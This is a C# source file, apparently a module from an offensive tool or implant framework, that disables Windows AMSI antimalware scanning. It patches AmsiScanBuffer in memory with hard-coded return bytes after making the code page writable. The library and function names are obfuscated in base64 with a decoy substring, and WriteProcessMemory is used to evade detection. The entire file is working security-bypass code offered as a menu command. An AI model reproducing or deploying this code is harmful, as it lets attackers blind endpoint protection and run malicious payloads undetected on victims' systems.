using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Collections.Generic;


namespace Application 
{
    public static class AVBPModule
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
        
        public static Dictionary<string,string> GetInstructions()
        {
            Dictionary<string,string> menuextensions = new Dictionary<string,string>(){
                {"disableit", "Patch AMSI Scan Buffer"},
                {"checkit", "\tCheck whether an AV/EDR running (Not Implemented)"}

            };
            return menuextensions;
        }

        public static void Operate(string[] instruction) {
            switch (instruction[0])
            {
                case "disableit":
                    Console.WriteLine("AV is getting disabled.");
                    AVBP();
                    break;                                 
                default:
                    Console.WriteLine("instruction couldn't be found in AVBP module");
                    break;
            }
        }
        public static void AVBP()
        {
            if (isit())
                Op(x64);
            else
                Op(x86);
        }

        private static void Op(byte[] p)
        {
            try
            {
                string a = "YW1zaURvZGd5LmRsbA==";
                string ab = "QW1zaVNjRG9kZ3lhbkJ1ZmZlcg==";
                
                string ca = Regex.Replace(Encoding.UTF8.GetString(Convert.FromBase64String(a)),"Dodgy","");
                string cab = Regex.Replace(Encoding.UTF8.GetString(Convert.FromBase64String(ab)),"Dodgy","");

                var lib = LoadLibrary(ca);
                IntPtr addr = GetProcAddress(lib, cab);

                uint oldProtect;
                VirtualProtect(addr, (UIntPtr)p.Length, 0x40, out oldProtect);

                WI(p,addr);
                
            }
            catch (Exception e)
            {
                Console.WriteLine(" [x] {0}", e.Message);
                Console.WriteLine(" [x] {0}", e.InnerException);
            }
        }

        private static void WI(byte[] p, IntPtr addr) 
        {        
            IntPtr bytesWritten = IntPtr.Zero;
            
            // Get the process handle for the current process
            var handle = Process.GetCurrentProcess().Handle;
            
            // Use WPM instead of Marshal.Copy
            WriteProcessMemory(handle, addr, p, p.Length, out bytesWritten);
        }

        private static bool isit()
        {
            bool is64Bit = true;

            if (IntPtr.Size == 4)
                is64Bit = false;

            return is64Bit;
        }
    }
}

